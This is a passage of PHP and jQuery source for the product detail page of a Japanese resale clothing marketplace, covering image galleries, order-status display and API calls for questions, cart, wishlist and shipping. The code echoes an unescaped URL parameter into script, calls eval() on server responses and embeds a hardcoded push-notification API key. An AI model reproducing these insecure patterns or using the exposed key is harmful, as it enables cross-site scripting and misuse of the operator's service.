                        $('#modal14').html(resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront14);
                        $('#modal15').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback1);
                        $('#modal16').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback2);
                        $('#modal17').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback12);
                        $('#modal18').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback3);
                        $('#modal19').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback4);
                        $('#modal20').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback5);
                        $('#modal21').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback6);
                        $('#modal22').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback7);
                        $('#modal23').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback8);
                        $('#modal24').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback9);
                        $('#modal25').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback10);
                        $('#modal26').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback11);
                        $('#modal27').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback13);
                        $('#modal28').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback14);
                        $('#modal29').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront15);
                        $('#modaldoublewidth').html(resdata.ENTITY_LIST[0].finishmeasurementvalueback15);
                        var div = document.getElementById("imageDiv");
                        div.innerHTML = ""; // clear images
                        var imagesList = [];
                        var imgcnt = 0;
                        imagesList.push(resdata.IMAGE_ARRAY.imagename1);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename2);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename3);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename4);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename5);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename6);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename7);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename8);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename9);
                        imagesList.push(resdata.IMAGE_ARRAY.imagename10);
                        for (counter = 0; counter <= imagesList.length - 1; counter++) {

                            if (imagesList[counter] != null) {
                                imgcnt = imgcnt + 1;

                                var imagem = document.createElement("img");
                                imagem.src =
                                    'https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/' +
                                    imagesList[counter];
                                imagem.id = "imagename" + (counter + 1);
                                div.appendChild(imagem);
                            }
                        }
                        document.getElementById('imgcount').innerHTML = resdata.ENTITY_LIST[0]
                            .imagecount;
                        if (document.getElementById('imagename1')) {
                            document.getElementById('imagename1').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename1;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename1;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 1;
                                });
                        }
                        if (document.getElementById('imagename2')) {
                            document.getElementById('imagename2').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename2;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename2;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 2;
                                });
                        }
                        if (document.getElementById('imagename3')) {
                            document.getElementById('imagename3').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename3;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename3;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 3;
                                });
                        }
                        if (document.getElementById('imagename4')) {
                            document.getElementById('imagename4').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename4;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename4;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 4;
                                });
                        }
                        if (document.getElementById('imagename5')) {
                            document.getElementById('imagename5').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename5;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename5;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 5;
                                });
                        }
                        if (document.getElementById('imagename6')) {
                            document.getElementById('imagename6').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename6;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename6;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 6;
                                });
                        }
                        if (document.getElementById('imagename7')) {
                            document.getElementById('imagename7').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename7;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename7;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 7;
                                });
                        }
                        if (document.getElementById('imagename8')) {
                            document.getElementById('imagename8').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename8;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename8;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 8;
                                });
                        }
                        if (document.getElementById('imagename9')) {
                            document.getElementById('imagename9').addEventListener('click',
                                function() {
                                    // document.getElementById("dataimg").src = "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" + resdata.ENTITY_LIST[0].imagename9;
                                    document.getElementById('img_no').innerHTML = 9;
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename9;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                });
                        }
                        if (document.getElementById('imagename10')) {
                            document.getElementById('imagename10').addEventListener('click',
                                function() {
                                    var image1 =
                                        "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/" +
                                        resdata.IMAGE_ARRAY.imagename10;
                                    var html = [
                                        '<div class="uicomponent-panel-controls-container">',
                                        '<img src=' + image1 + '>',
                                        '</div>'
                                    ].join('\n');

                                    document.getElementsByClassName('single-slide')[0]
                                        .innerHTML = html;
                                    document.getElementById('img_no').innerHTML = 10;
                                });
                        }
                        if (resdata.ENTITY_LIST[0].wishlist != "No") {
                            setTimeout(function() {
                                $(".ec-btn-group.wishlist").addClass("active1");
                                $(".ec-btn-group.wishlist").children().addClass(
                                    "svg_wish");
                                $("#wishlistbtn").click(function(e) {
                                    remove(resdata.ENTITY_LIST[0].wishlistid);
                                });

                                // $(".wishlist").css('background-color', '#662d91').css("border-color", "#662d91");
                                // $(".wishlistbtntxt").css("fill", 'white');
                            }, 100);
                        }
                        const container = document.getElementsByClassName('single-slide')[0];
                        const displayimg = document.getElementById("dataimg");
                        container.addEventListener("mousemove", onZoom);
                        container.addEventListener("mouseover", onZoom);
                        container.addEventListener("mouseleave", offZoom);

                        function onZoom(e) {
                            $('.zoom-image-hover').zoom();
                        }

                        function offZoom(e) {
                            displayimg.style.transformOrigin = `center center`;
                            displayimg.style.transform = "scale(1)";
                        }
                        if (resdata.ENTITY_LIST[0].cart != "No") {
                            setTimeout(function() {
                                // document.getElementById("checkoutbtn").disabled = true;
                                document.getElementById('checkoutbtndiv').innerHTML =
                                    '<h3>取引中</h3>';
                            }, 100);
                        }
                        // if ('< ?php //echo $visitor_no  ? > ' == 0) {
                        //     setTimeout(function() {
                        //         $('.wishlist').css('display', 'none');
                        //         $("#wishlistbtn").css('display', 'none');
                        //         $("#checkoutbtndiv").css('display', 'none');
                        //     }, 100);
                        // }

                        if ('<?php echo isset($_GET["cond"]) ? $_GET["cond"] : "" ?>' !=
                            'normal') {
                            if (resdata.ENTITY_LIST[0].sellerno ==
                                '<?php echo $visitor_no ?>') {
                                    console.log("yes match");
                                setTimeout(function() {
                                    $("#soldtext").css('display', 'block');
                                    $('.wishlist').css('display', 'none');
                                    $("#wishlistbtn").css('display', 'none');
                                    $("#checkoutbtndiv").css('display', 'none');
                                    $("#normaldiv").css('display', 'none');
                                    $("#solddivid").css('display', 'none');

                                    if ((resdata.ENTITY_LIST[0].productStatus == '4') && resdata
                                        .ENTITY_LIST[0].deliverycategory != 1) {
                                        $("#addresslbl").css('display',
                                            'none !important');
                                        $("#solddivid").css('display',
                                            'none');
                                     
                                            
                                        } else if (resdata.ENTITY_LIST[0].productStatus == '4') {
                                        $("#solddivid").css('display', 'block');
                                        $("#addresslbl").css('display', 'block');
                                        $("#addresslbl").css('display', 'block');
                                        $("#contactlbl").css('display', 'block');
                                        $("#shipmentinfo").css('display', 'block');
                                        $("#unamelbl").css('display', 'block');
                                       

                                    }else if (resdata.ENTITY_LIST[0].productStatus == '6') {
                                      
                                        $("#solddivid").css('display', 'none');
                                        $("#shiptext").css('display', 'block');
                                        $("#soldtext").css('display', 'none');

                                    } else if (resdata.ENTITY_LIST[0].productStatus == '7') {
                                       
                                        $("#soldtext").css('display', 'none');
                                        $("#solddivid").css('display', 'none');
                                        $("#buyerbtn2").css('display', 'block').css('font-size', '24px').css('font-weight', 'bold').css('color', 'red').css('margin-bottom', '-70px');
                                        document.getElementById('buyerbtn2').innerHTML = "受取完了";



                                    } else if (resdata.ENTITY_LIST[0].productStatus == '8') {
                                        $("#soldtext").css('display', 'none');
                                        $("#solddivid").css('display', 'none');
                                        $("#buyerbtn2").css('display', 'block').css('font-size', '24px').css('font-weight', 'bold').css('color', 'red').css('margin-bottom', '-70px');
                                        document.getElementById('buyerbtn2').innerHTML = "取引終了";
                                    } else {
                                        $("#solddivid").css('display', 'none');
                                        $("#address").css('display', 'none !important');
                                        $("#addresslbl").css('display',
                                            'none !important');
                                        $("#uname").css('display', 'none !important');
                                      

                                    }
                                    // if (resdata.ENTITY_LIST[0].productStatus == '4' ||
                                    //     resdata.ENTITY_LIST[0].productStatus == '6') {
                                    //     $("#unamelbl").css('display', 'block');

                                    // }

                                }, 100);
                            }

                            if (resdata.ENTITY_LIST[0].buyerno == '<?php echo $visitor_no ?>') {
                                setTimeout(function() {
                                    // if (resdata.ENTITY_LIST[0].buyerreceiveflag == false) {
                                    //     $("#buyerbtn").css('display', 'block');
                                    // }
                                    if (resdata.ENTITY_LIST[0].displaycancelbutton ==
                                        'no') {

                                        $("#buyerbtntxt").css('display', 'none');
                                        // $("#buyerbtn2txt").css('margin-left', '-100%');
                                    }
                                    if (resdata.ENTITY_LIST[0].productStatus != '6') {
                                        $("#buyerbtn2").css('display', 'none');
                                    } else {
                                        $("#buyerbtn2").css('display', 'block');
                                    }
                                    // $("#buyerbtn").css('display', 'block');
                                    $('.wishlist').css('display', 'none');
                                    $("#wishlistbtn").css('display', 'none');
                                    $("#checkoutbtndiv").css('display', 'none');
                                    $("#normaldiv").css('display', 'none');

                                }, 100);
                            }
                        }
                        if (resdata.ENTITY_LIST[0].productStatus == 4 && resdata.ENTITY_LIST[0].buyerno == '<?php echo $visitor_no ?>') {
                            setTimeout(function() {
                                $("#buyerbtn2").css('display', 'block').css('font-size', '24px').css('font-weight', 'bold').css('color', 'red').css('margin-bottom', '-70px');
                                document.getElementById('buyerbtn2').innerHTML = "商品発送待ち";

                            }, 100);
                        }

                        if (resdata.ENTITY_LIST[0].productStatus == 7 && resdata.ENTITY_LIST[0].buyerno == '<?php echo $visitor_no ?>') {
                            setTimeout(function() {
                                $("#buyerbtn2").css('display', 'block').css('font-size', '24px').css('font-weight', 'bold').css('color', 'red').css('margin-bottom', '-70px');
                                document.getElementById('buyerbtn2').innerHTML = "受取完了";

                            }, 100);
                        }

                        if (resdata.ENTITY_LIST[0].productStatus == 8 && resdata.ENTITY_LIST[0].buyerno == '<?php echo $visitor_no ?>') {
                            setTimeout(function() {
                                $("#buyerbtn2").css('display', 'block').css('font-size', '24px').css('font-weight', 'bold').css('color', 'red').css('margin-bottom', '-70px');
                                document.getElementById('buyerbtn2').innerHTML = "取引終了";

                            }, 100);
                        }

                        if (resdata.ENTITY_LIST[0].productStatus == '2' && resdata.ENTITY_LIST[0].sellerno !=
                            '<?php echo $visitor_no ?>') {
                            setTimeout(function() {
                                $("#checkoutbtndiv").css('display', 'block');
                                $("#wishlistbtn").css('display', 'block');
                            }, 100);
                        }

                        if (resdata.ENTITY_LIST[0].productStatus == '4' || resdata.ENTITY_LIST[0].productStatus == '6' || resdata.ENTITY_LIST[0].productStatus == '7' || resdata.ENTITY_LIST[0].productStatus == '8' && resdata.ENTITY_LIST[
                            0].sellerno !='<?php echo $visitor_no ?>')
                        {    
                            // document.getElementById('q-nahide').style.display = "none";
                            $("#normaldiv").css('display', 'none');
                            document.getElementById('sold').style.display = "block";
                            // document.getElementById("your-commemt").style.backgroundColor= "lightgray";
                        
                        } 
                        if (resdata.ENTITY_LIST[0].productStatus == '4' || resdata.ENTITY_LIST[0].productStatus == '6' || resdata.ENTITY_LIST[0].productStatus == '7' || resdata.ENTITY_LIST[0].productStatus == '8' && resdata.ENTITY_LIST[0]
                            .buyerno !='<?php echo $visitor_no ?>')
                        {    
                            // document.getElementById('q-nahide').style.display = "none";
                            $("#normaldiv").css('display', 'none');
                            document.getElementById('sold').style.display = "block";
                            // document.getElementById("your-commemt").style.backgroundColor= "lightgray";
                        
                        }
                    $('#process').modal('hide');
                    },
                    error: function(xhr, status, error) {
                        var err = eval("(" + xhr.responseText + ")");
                        alert(err.Message);
                    }
                });
            });
        });
    </script>
    <script>
        $("#question").submit(function(e) {
            $('#modal_confirm').modal('show');
            document.getElementById('modaltxt').innerHTML = "Q&Aを入力してもよろしいでしょうか？";
            return false;
        });
    </script>
    <script>
        var arr = [];
        var galarr = [];

        function Next() {
            document.getElementById("imageDiv").scrollLeft += 250;
        }

        function Prev() {
            document.getElementById("imageDiv").scrollLeft -= 250;
        }
    </script>
    <script>
        $(function() {

            // $('form').on('submit', function(e) {
            $(".no_login_qa").click(function(e) {
                e.preventDefault();
                window.location.href = "Login.php";
            });
        });
    </script>
    <script>
        $(function() {
            $("#confirm-button").click(function(e) {

                e.preventDefault();
                var currentdate = new Date();
                var datetime = currentdate.getDate() + "/" +
                    (currentdate.getMonth() + 1) + "/" +
                    currentdate.getFullYear() + " " +
                    currentdate.getHours() + ":" +
                    currentdate.getMinutes() + ":" +
                    currentdate.getSeconds();

                $.ajax({
                    type: 'post',
                    url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/question',
                    contentType: "application/json;charset=UTF-8",
                    data: JSON.stringify({
                        "visitor_no": '<?php echo $visitor_no ?>',
                        // "visitor_name": document.getElementById("your-name").value,
                        // "mailaddress": document.getElementById("your-email").value,
                        "chartno": chart_no,
                        "thingno": thing_no,
                        "lineno": lineno,
                        "question": document.getElementById("your-commemt").value,
                        "question_datetime": datetime,
                        "mailsentflag": "1",
                        "added_by": '<?php echo $username ?>',
                        "proctype": "INS"

                    }),
                    dataType: 'json',
                    success: function(resdata) {
                        // console.log("success", resdata);
                        successmsg = resdata['APISTATUS']['Message '];
                        if (resdata['APISTATUS']['status'] == 0) {
                            $('#modal_confirm1').modal('show');
                            document.getElementById('msgtxt').innerHTML = successmsg;
                            // $.ajax({
                            //     type: "post",
                            //     url: "user_profile_email.php",
                            //     data: {
                            //         classificationName: document.getElementById('classificationName').innerHTML,
                            //         brand: document.getElementById('brand').innerHTML,
                            //         question: document.getElementById("your-commemt").value,
                            //         visitornickname: resdata['APISTATUS']['VISITORNICKNAME'],
                            //         visitorname: nickname,
                            //         visitorno: "<?php echo isset($_SESSION['Visitor_no']) ? $_SESSION['Visitor_no'] : 0; ?>",
                            //         mailaddress: selleremail,
                            //         product_reg_no: registerno,
                            //         screen: 'qna'
                            //     },
                            //     success: function(respdata) {
                            //         console.log(respdata);
                            //     },
                            //     error: function(xhr, status, error) {
                            //         var err = eval("(" + xhr.responseText + ")");
                            //         alert(err.Message);
                            //         console.log(this.data);
                            //     }
                            // });

                            $.ajax({
                                type: "post",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Authorization": "key=AIzaSyAE3yqEtTCFrCLq9yO-AZJ_0gk_w1ptm4I"
                                },

                                url: "https://asia-northeast1-happysaifulmobile.cloudfunctions.net/CF_Push_Notification",
                                data: JSON.stringify({
                                    "userid": sellernum,
                                    "msgbody": btoa(unescape(encodeURIComponent("登録番号：" + registerno + "\n 商品名：" + document.getElementById(
                                        'classificationName').innerHTML + "\n ブランド：" + document.getElementById('brand').innerHTML))),
                                    "msgtitle": btoa(unescape(encodeURIComponent('出品商品について質問が届いています'))),
                                    "url": "Views/notification.php"
                                }),
                                success: function(respdata) {
                                    // console.log(respdata);
                                    // console.log(this.data);
                                },
                                error: function(xhr, status, error) {
                                    var err = eval("(" + xhr.responseText + ")");
                                    alert(err.Message);
                                    // console.log(this.data);
                                }
                            });

                        }

                        // console.log(this.data);

                    },
                    error: function(xhr, status, error) {
                        var err = eval("(" + xhr.responseText + ")");
                        alert(err.Message);
                        // console.log(this.data);
                    }
                });

            });

            $("#checkoutbtn").click(function(e) {

                e.preventDefault();
                // $('#cart_confirm').modal('show');
                // $("#checkoutbtn").click(function(e) {
                $.ajax({
                    type: 'post',
                    url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/cart',
                    contentType: "application/json;charset=UTF-8",
                    data: JSON.stringify({
                        "visitor_no": '<?php echo $visitor_no ?>',
                        "chartno": chart_no,
                        "thingno": thing_no,
                        "lineno": lineno,
                        "flag": "1",
                        "added_by": '<?php echo $username ?>',
                        "proctype": "INS"

                    }),
                    dataType: 'json',
                    success: function(resdata) {
                        // console.log("success", resdata);
                        successmsg = resdata['APISTATUS']['Message '];
                        if (resdata['APISTATUS']['status'] == 0) {
                            window.location.href = "cart.php";
                            // document.getElementById("checkoutbtn").disabled = true;
                            // document.getElementsByClassName('cart-count-lable')[0].innerHTML = parseInt(document.getElementsByClassName('cart-count-lable')[0].innerHTML) + 1;
                            // $('#modal_confirm1').modal('show');
                            // document.getElementById('msgtxt').innerHTML = successmsg;
                        }


                        // console.log(this.data);

                    },
                    error: function(xhr, status, error) {
                        var err = eval("(" + xhr.responseText + ")");
                        alert(err.Message);
                        // console.log(this.data);
                    }
                });
                // });

            });

            // $("#wishlistbtn").click(function(e) {
            //     e.preventDefault();
            //     $.ajax({
            //         type: 'post',
            //         url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/wishlist',
            //         contentType: "application/json;charset=UTF-8",
            //         data: JSON.stringify({
            //             "visitor_no": '<?php // echo $visitor_no 
                                            ?>',
            //             "chartno": chart_no,
            //             "thingno": thing_no,
            //             "lineno": lineno,
            //             "added_by": '<?php // echo $username 
                                        ?>',
            //             "proctype": "INS"

            //         }),
            //         dataType: 'json',
            //         success: function(resdata) {
            //             console.log("success", resdata);
            //             successmsg = resdata['APISTATUS']['Message'];
            //             if (resdata['APISTATUS']['status'] == 0) {
            //                 setTimeout(function() {
            //                     // $(".wishlist").css('background-color', 'white').css("border-color", "#662d91");
            //                     // $(".wishlistbtntxt").css("fill", 'red');
            //                 }, 100);
            //             }
            //             // uploadFile();
            //             // $('#modal_confirm1').modal('show');
            //             // document.getElementById('msgtxt').innerHTML = successmsg;
            //             document.getElementById('cnt').innerHTML = parseInt(document.getElementById('cnt').innerHTML) + 1;
            //             console.log(this.data);

            //         },
            //         error: function(xhr, status, error) {
            //             var err = eval("(" + xhr.responseText + ")");
            //             alert(err.Message);
            //             console.log(this.data);
            //         }
            //     });

            // });

            $("#buyerbtntxt").click(function(e) {
                e.preventDefault();
                $.ajax({
                    type: 'post',
                    url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/productCancelflag',
                    contentType: "application/json;charset=UTF-8",
                    data: JSON.stringify({
                        "registerno": registerno,
                        "product_status": "2"
                    }),
                    dataType: 'json',
                    success: function(resdata) {
                        // console.log("success", resdata);
                        successmsg = resdata['APISTATUS']['Message '];
                        $('#modal_confirm1').modal('show');
                        document.getElementById('msgtxt').innerHTML = successmsg;
                        // console.log(this.data);

                    },
                    error: function(xhr, status, error) {
                        var err = eval("(" + xhr.responseText + ")");
                        alert(err.Message);
                        // console.log(this.data);
                    }
                });

            });

            $("#reciveproductbtn").click(function(e) {
                e.preventDefault();
                $.ajax({
                    type: 'post',
                    url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/productbuyerflag',
                    contentType: "application/json;charset=UTF-8",
                    data: JSON.stringify({
                        "registerno": registerno,
                        "product_status": "7",
                        "deliverymailsentflag": "1"
                    }),
                    dataType: 'json',
                    success: function(resdata) {
                        // console.log("success", resdata);
                        successmsg = resdata['APISTATUS']['Message '];
                        // $.ajax({
                        //     type: "post",
                        //     url: "user_profile_email.php",
                        //     data: {
                        //         username: nickname,
                        //         registerno: registerno,
                        //         productName: document.getElementById(
                        //             'classificationName').innerHTML,
                        //         brand: document.getElementById('brand').innerHTML,
                        //         price: document.getElementById('sellingPrice')
                        //             .innerHTML,
                        //         selleremailid: selleremail,
                        //         screen: 'product_recived'
                        //     }
                        // });
                        $('#modal_confirm1').modal('show');
                        document.getElementById('msgtxt').innerHTML = successmsg;
                        if (resdata['APISTATUS']['status'] == 0) {
                            $.ajax({
                                type: "post",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Authorization": "key=AIzaSyAE3yqEtTCFrCLq9yO-AZJ_0gk_w1ptm4I"
                                },
                                url: "https://asia-northeast1-happysaifulmobile.cloudfunctions.net/CF_Push_Notification",
                                data: JSON.stringify({
                                    "userid": sellernum,
                                    "msgbody": btoa(unescape(encodeURIComponent("お客様が出品された商品を購入者様宛てに発送しましたのでお知らせいたします｡"))),
                                    "msgtitle": btoa(unescape(encodeURIComponent('【Happyサイフル出品商品発送のお知らせ】'))),
                                    "url": "Views/top1.php"
                                }),
                                success: function(respdata) {
                                    // console.log(respdata);
                                    // console.log(this.data);
                                },
                                error: function(xhr, status, error) {
                                    var err = eval("(" + xhr.responseText + ")");
                                    alert(err.Message);
                                    // console.log(this.data);
                                }
                            });
                        }
                        // console.log(this.data);

                    },
                    error: function(xhr, status, error) {
                        var err = eval("(" + xhr.responseText + ")");
                        alert(err.Message);
                        // console.log(this.data);
                    }
                });

            });

            $("#currier-confirm-button").click(function(e) {
                $('#process').modal('show');
                e.preventDefault();
                $.ajax({
                    type: 'POST',
                    url: "http://141.147.145.177:8081/shpml-web/saifuru/view/productUpdateCourier",
                    contentType: "application/json;charset=UTF-8",
                    data: JSON.stringify({
                        "registerno": registerno,
                        "denpyobangou": document.getElementById("slipnumber").value,
                        "courier_service_name": document.getElementById("carrier").value,
                        "product_status": "6"
                    }),
                    success: function(resdata) {
                        // console.log(resdata);
                        successmsg = resdata['APISTATUS']['Message '];
                        // uploadFile();
                        $.ajax({
                            type: "post",
                            url: "user_profile_email.php",
                            data: {
                                username: document.getElementById('uname').innerHTML,
                                registerno: registerno,
                                productName: document.getElementById(
                                    'classificationName').innerHTML,
                                brand: document.getElementById('brand').innerHTML,
                                price: document.getElementById('sellingPrice')
                                    .innerHTML,
                                slipnumber: document.getElementById("slipnumber").value,
                                carrier: document.getElementById("carrier").value,
                                buyeremail: buyeremail,
                                screen: 'product_detail'
                            },
                            success: function(respdata) {
                                $('#process').modal('hide');
                                $('#modal_confirm1').modal('show');
                                document.getElementById('msgtxt').innerHTML = successmsg;
                            },
                            error: function(xhr, status, error) {
                                var err = eval("(" + xhr.responseText + ")");
                                // alert(err.Message);
                                // console.log(this.data);
                            }
                        });

                    },

                    error: function(error) {
                        // alert("error");
                        // console.log(error);
                        // console.log(this.data);
                    }
                });


            });
        });
    </script>
    <script>
        $(document).ready(function() {
            if ('<?php echo $visitor_no ?>' == 0) {
                $("#checkoutbtn").click(function(e) {
                    window.location.href = "Login.php";
                });
                $("#wishlistbtn").click(function(e) {
                    window.location.href = "Login.php";
                });
            } else {
                $('#qa_form').css('display', 'block');
            }
        });
    </script>
    <script>
        function wish(value) {
            var settings = {
                "url": "http://141.147.145.177:8081/shpml-web/saifuru/view/wishlist",
                "method": "POST",
                "timeout": 0,
                "headers": {
                    "Content-Type": "application/json"

                },
                "data": JSON.stringify({
                    "visitor_no": '<?php echo $visitor_no ?>',
                    "chartno": chart_no,
                    "thingno": thing_no,
                    "lineno": lineno,
                    "added_by": '<?php echo $username ?>',
                    "proctype": "INS"
                }),
            };

            $.ajax(settings).done(function(response) {
                console.log(response)
                console.log(response.APISTATUS.Id);
                if (response.APISTATUS.status == 0) {
                    window.location.reload();
                    if (window.innerWidth > 700) {
                        document.getElementById('cnt').innerHTML = parseInt(document.getElementById('cnt')
                            .innerHTML) + 1;
                    } else {
                        document.getElementById('cnt1').innerHTML = parseInt(document.getElementById('cnt1')
                            .innerHTML) + 1;
                    }
                }

            });

        }
    </script>
    <script>
        function remove(id) {
            var settings = {
                "url": "http://141.147.145.177:8081/shpml-web/saifuru/view/wishlist",
                "method": "POST",
                "timeout": 0,
                "headers": {
                    "Content-Type": "application/json"

                },
                "data": JSON.stringify({
                    "id": id,
                    "proctype": "DEL"
                }),
            };

            $.ajax(settings).done(function(response) {
                console.log(response);
                if (response.APISTATUS.status == 0) {
                    window.location.reload();
                    // if (window.innerWidth > 700) {
                    //     document.getElementById('cnt').innerHTML = parseInt(document.getElementById('cnt').innerHTML) - 1;
                    // } else {
                    //     document.getElementById('cnt1').innerHTML = parseInt(document.getElementById('cnt1').innerHTML) - 1;
                    // }
                }
                //   wish_remove(0);
            });

        }
    </script>
    <script>
        $(document).ready(function() {
            $(".zoom-btn").click(function() {
                $(".size-hide-product").toggleClass("display");
                $(".size-img-prod").toggleClass("display");
                $(".zoom-out-svg").toggleClass("display");
                $(".zoom-in-svg").toggleClass("display");
                $(".zoom-in-svg").toggleClass("display");

                $("#1").toggleClass("finishmeasurementvaluefront1");
                $("#1").toggleClass("finishmeasurementvaluefront1_1");

                $("#2").toggleClass("finishmeasurementvaluefront2");
                $("#2").toggleClass("finishmeasurementvaluefront2_1");

                $("#3").toggleClass("finishmeasurementvaluefront3");
                $("#3").toggleClass("finishmeasurementvaluefront3_1");

                $("#4").toggleClass("finishmeasurementvaluefront4");
                $("#4").toggleClass("finishmeasurementvaluefront4_1");

                $("#5").toggleClass("finishmeasurementvaluefront5 ");
                $("#5").toggleClass("finishmeasurementvaluefront5_1");

                $("#6").toggleClass("finishmeasurementvaluefront6");
                $("#6").toggleClass("finishmeasurementvaluefront6_1");

                $("#7").toggleClass("finishmeasurementvaluefront7");
                $("#7").toggleClass("finishmeasurementvaluefront7_1");

                $("#8").toggleClass("finishmeasurementvaluefront8");
                $("#8").toggleClass("finishmeasurementvaluefront8_1");

                $("#9").toggleClass("finishmeasurementvaluefront9");
                $("#9").toggleClass("finishmeasurementvaluefront9_1");

                $("#10").toggleClass("finishmeasurementvaluefront10");
                $("#10").toggleClass("finishmeasurementvaluefront10_1");

                $("#11").toggleClass("finishmeasurementvaluefront11");
                $("#11").toggleClass("finishmeasurementvaluefront11_1");

                $("#12").toggleClass("finishmeasurementvaluefront12");
